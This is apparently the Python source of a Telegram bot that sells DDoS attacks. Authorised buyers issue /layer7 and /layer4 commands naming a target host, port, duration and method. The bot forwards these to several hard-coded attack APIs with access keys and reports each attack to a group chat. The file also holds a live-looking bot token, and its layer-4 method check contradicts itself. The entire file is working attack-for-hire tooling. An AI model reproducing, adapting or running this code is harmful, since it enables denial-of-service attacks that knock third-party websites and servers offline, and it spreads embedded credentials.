import telebot
import time
import json
import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot = telebot.TeleBot("7225990350:AAHD5QITiV17DQGwiAQ7Z6aupHaRp1hPAi0")

admin_id = 6343573113

allowed_users = []

group_ngu = -1002185176881

start_time = time.time()

@bot.message_handler(commands=["layer7"])
def attack(message):
    user_id = message.from_user.id
    if message.from_user.id not in allowed_users:
        bot.reply_to(message, "You are not authorized to use this command\nContact to buy: t.me/stress_ghost_PLAN_bot")
        return

    if len(message.text.split()) < 5:
        bot.reply_to(message, 'example: /layer7 https://goole.com 443 60 flood')
        return

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]

    if not all([host, port, time, method]):
        bot.reply_to(message, "example: /layer7 https://goole.com 443 60 flood")
        return

    if int(time) > 120:
        bot.reply_to(message, 'Error Time | Max Time 120s')
        return

    try:
        port = int(port)
    except ValueError:
        bot.reply_to(message, "Error Port")
        return

    # Kiểm tra port
    if port < 1 or port > 443:
        bot.reply_to(message, "Error Port")
        return


    if method not in ["tls", "captcha", "flood"]:
        bot.reply_to(message, "Error Method")
        return


    # Kiểm tra URL
    if not host.startswith("https://"):
        bot.reply_to(message, "Error Url = https:// ")
        return

    username = message.from_user.username

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]  

    api1 = f"http://100.42.183.147:1111/api/attack?host={host}&port={port}&time={time}&method={method}"
    api2 = f"http://103.180.147.119:1111/api/attack?host={host}&port={port}&time={time}&method={method}"
    api3 = f"http://51.68.214.19/api/attack?username=nat&key=nat&host={host}&port={port}&time={time}&method=tls"
    api4 = f"http://103.180.147.134:1111/api/attack?host={host}&port={port}&time={time}&method={method}"
    api5 = f"https://phuongthuy.love/api?key=concucc_xc2Azc&host={host}&port={port}&time={time}&method=bypasss"
    # api5 = f"https://dovpoapis.fun/api?username=nat&key=2289&host={host}&port={port}&time={time}&method=HTTP-TLS"

    response = requests.get(api1)
    response = requests.get(api2)
    response = requests.get(api3)
    response = requests.get(api4)
    response = requests.get(api5)
    # response = requests.get(api5)

    markup = telebot.types.InlineKeyboardMarkup()
    button = telebot.types.InlineKeyboardButton(text="Check-Host", url=f"https://check-host.net/check-http?host={host}")
    markup.add(button)

    bot.reply_to(message, f'Attack sent to all servers\nMethod: L7 | Host: {host} | Port: {port} | Time: {time}', reply_markup=markup)

    bot.send_message(group_ngu, f"attack information - L7 - Vip\n@{message.from_user.username}\n- Host: {host}\n- Port: {port}\n- Time: {time}\n- Method: {method}")

@bot.message_handler(commands=["layer4"])
def attack(message):
    user_id = message.from_user.id
    if message.from_user.id not in allowed_users:
        bot.reply_to(message, "You are not authorized to use this command\nContact to buy: t.me/stress_ghost_PLAN_bot")
        return

 
    if len(message.text.split()) < 5:
        bot.reply_to(message, 'example: /layer4 8.8.8.8 80 60 tcp')
        return

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]

    if not all([host, port, time, method]):
        bot.reply_to(message, "example: /layer4 8.8.8.8 80 60 tcp")
        return

    if int(time) > 120:
        bot.reply_to(message, 'Error Time | Max Time 120s')
        return

    try:
        port = int(port)
    except ValueError:
        bot.reply_to(message, "Error Port")
        return

    # Kiểm tra port
    if port < 1 or port > 443:
        bot.reply_to(message, "Error Port")
        return


    if method not in ["tls", "captcha", "flood"]:
        bot.reply_to(message, "Error Method")
        return

    if method not in ["gudp", "ovh-tcp", "tcp", "socket", "udpbypass", "home"]:
        bot.reply_to(message, "Invalid attack method")
        return

    username = message.from_user.username

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]  

    api = f"http://51.68.214.19/api/attack?username=nat&key=nat&host={host}&port={port}&time={time}&method={method}"

    response = requests.get(api)

    markup = telebot.types.InlineKeyboardMarkup()
    button = telebot.types.InlineKeyboardButton(text="Check_Host", url=f"https://check-host.net/check-tcp?host={host}")
    markup.add(button)

    bot.reply_to(message, f'Attack sent to all servers\nMethod: L4 | Host: {host} | Port: {port} | Time: {time}', reply_markup=markup)

    bot.send_message(group_ngu, f"attack information - L4 - Vip\n@{message.from_user.username}\n- Host: {host}\n- Port: {port}\n- Time: {time}\n- Method: {method}")

@bot.message_handler(commands=['start'])
def help(message):
    help_text = '''
/layer7 | attack L7
/layer4 | attack L4
/method - method ddos
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['method'])
def help(message):
    help_text = '''
• L7
• tls
• flood
• captcha
• L4
• gudp
• tcp
For example: 
/layer7 <host> <port> <time> <method>
/layer4 <host> <port> <time> <method>
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['id'])
def add_user(message):
    if message.from_user.id == admin_id:
        try:
            user_id = int(message.text.split()[1])  # Lấy ID người dùng từ tin nhắn
            allowed_users.append(user_id)
            bot.reply_to(message, f"Đã thêm ID {user_id} vào danh sách.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Vui lòng nhập ID người dùng.")
    else:
        bot.reply_to(message, "Bạn không có quyền thực hiện lệnh này.")

@bot.message_handler(commands=['xoaid'])
def remove_user(message):
    if message.from_user.id == admin_id:
        try:
            user_id = int(message.text.split()[1])  # Lấy ID người dùng từ tin nhắn
            allowed_users.remove(user_id)
            bot.reply_to(message, f"Đã xóa ID {user_id} khỏi danh sách.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Vui lòng nhập ID người dùng.")
        except ValueError:
            bot.reply_to(message, "ID người dùng không tồn tại trong danh sách.")
    else:
        bot.reply_to(message, "Bạn không có quyền thực hiện lệnh này.")

@bot.message_handler(commands=['time'])
def uptime(message):
    # Tính toán thời gian bot đã hoạt động
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)

    # Chuyển đổi sang định dạng ngày giờ
    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    uptime_hours, uptime_minutes = divmod(uptime_minutes, 60)
    uptime_days, uptime_hours = divmod(uptime_hours, 24)

    # Tạo tin nhắn
    uptime_message = f"The bot is up and running :\n"
    if uptime_days > 0:
        uptime_message += f"{uptime_days} Days | "
    if uptime_hours > 0:
        uptime_message += f"{uptime_hours} Hour | "
    if uptime_minutes > 0:
        uptime_message += f"{uptime_minutes} minute | "
    uptime_message += f"{uptime_seconds} second | "

    # Gửi tin nhắn
    bot.reply_to(message, uptime_message)

bot.infinity_polling(timeout=60, long_polling_timeout=1)